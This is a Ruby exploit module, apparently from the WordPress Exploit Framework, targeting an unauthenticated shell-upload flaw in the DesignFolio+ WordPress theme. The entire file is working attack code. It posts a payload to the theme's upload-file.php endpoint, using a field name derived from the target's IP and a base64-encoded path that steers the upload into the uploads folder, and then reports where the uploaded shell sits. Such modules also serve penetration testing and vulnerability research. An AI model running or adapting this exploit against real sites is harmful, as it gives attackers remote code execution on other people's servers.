# frozen_string_literal: true

require 'socket'

class Wpxf::Exploit::DesignfolioPlusShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'DesignFolio+ Theme Unauthenticated Shell Upload',
      author: [
        'CrashBandicot', # Vulnerability disclosure
        'rastating'      # WPXF module
      ],
      references: [
        ['WPVDB', '7880'],
        ['EDB', '36372']
      ],
      date: 'Mar 04 2015'
    )
  end

  def check
    check_theme_version_from_readme('designfolio-plus')
  end

  def uploader_url
    normalize_uri(wordpress_url_themes, 'designfolio-plus', 'admin', 'upload-file.php')
  end

  def encoded_relative_path_to_uploads
    Base64.strict_encode64('../../../uploads')
  end

  def payload_body_builder
    target_ip = IPSocket.getaddress(target_host)
    field_name = Utility::Text.md5(target_ip)

    builder = Utility::BodyBuilder.new
    builder.add_file_from_string(field_name, payload.encoded, payload_name)
    builder.add_field('upload_path', encoded_relative_path_to_uploads)
    builder
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_uploads, payload_name.downcase)
  end
end
